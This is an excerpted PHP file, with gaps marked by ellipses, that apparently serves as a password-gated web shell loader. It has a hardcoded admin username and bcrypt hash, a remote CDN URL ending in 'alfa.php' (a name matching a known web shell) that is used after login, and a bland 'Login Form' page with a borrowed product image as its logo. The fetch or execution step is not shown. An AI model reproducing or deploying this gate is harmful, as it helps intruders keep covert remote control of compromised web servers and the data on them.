...
$username = "admin";
$passwordHash = '$2a$12$T6H89L7lJBW.RTDlnMlSn.p91iO/TfG3xqC6LSQ7/V3cqsOkxTrRC';
...
if (is_logged_in()) {
    $destiny = 'https://seo-lcw.b-cdn.net/akses/alfa.php';
    ...
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://m.media-amazon.com/images/I/71NqhJF7sbL._AC_UF894,1000_QL80_.jpg" alt="Logo">
                <h2>Login Form</h2>
                <?php if (isset($error)): ?>
